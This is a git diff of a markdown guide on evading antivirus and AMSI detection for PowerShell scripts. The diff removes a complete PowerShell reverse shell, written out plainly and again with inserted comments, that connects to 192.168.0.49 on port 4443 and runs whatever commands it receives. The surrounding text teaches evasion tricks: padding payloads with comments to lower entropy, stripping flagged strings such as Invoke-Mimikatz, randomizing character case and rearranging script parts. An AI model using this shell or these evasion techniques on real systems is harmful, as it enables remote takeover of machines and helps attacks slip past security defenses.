@@ -264,10 +264,12 @@ Obfuscating a script by appending comments here and there might actually do the 
 for example, a reverse shell command could be obfuscated like this:
 
 **Original** (Common r-shell command that is easily detected by AVs)  
-```$TCPClient = New-Object Net.Sockets.TCPClient('192.168.0.49', 4443);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()```
+![image](https://user-images.githubusercontent.com/75489922/232095239-6e46648f-6522-4cc5-a4a9-d423bffa34b4.png)
 
-**Modified** (appended <# SOME RANDOM COMMENT #> in various places)  
-```$TCPClient = New-Object <# SOME RANDOM COMMENT #> Net.Sockets.TCPClient('192.168.0.49', 4443);$NetworkStream = $TCPClient.GetStream() <# SOME RANDOM COMMENT #>;$StreamWriter = New-Object <# SOME RANDOM COMMENT #> IO.StreamWriter($NetworkStream);function WriteToStream ($String) <# SOME RANDOM COMMENT #> {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); <# SOME RANDOM COMMENT #> $Output = try {Invoke-Expression $Command 2>&1 | Out-String} <# SOME RANDOM COMMENT #> catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()```
+**Modified** (appended `<# Suspendisse imperdiet lacus eu tellus pellentesque suscipit #>` in various places)  
+![image](https://user-images.githubusercontent.com/75489922/232095887-ce5561ca-e568-421a-bd63-f34ee1097f6a.png)
+  
+This will not only work, but also lower the payloads `Shannon entropy` value (given that you don't use complex random comments).
 
 ### Removing Comments
 There are malware-ish strings that will trigger AMSI immediately and it should be a priority to replace them, when obfuscating scripts. Check this out:  
@@ -276,10 +278,13 @@ There are malware-ish strings that will trigger AMSI immediately and it should b
 Just by typing the string 'invoke-mimikatz' in the terminal AMSI is having a stroke (the script is not even present / loaded). 
 These strings may be found in comments as well, so it's a good idea to remove them, especially from FOS resources you grab from the internet (e.g. `Invoke-Mimikatz.ps1` from GitHub).  
   
-\*It's generally a good idea to remove comments, this was just an example.
+\*It's generally a good idea to remove comments. This was just an example.
 
 ## Randomize Char Cases
 Probably the oldest trick in the book. Randomazing the character case of cmdlets and parameters might help:
 ```
 inVOkE-eXpReSSioN -vErbOse "WHoAmI /aLL" -dEBug
 ```
+
+## Rearrange Script Components
+Sometimes simply moving variables and classes to different locations might work, especially if you have found the detection trigger and it includes some variable definition that could be taking place somewhere else, like the beginning of the script.
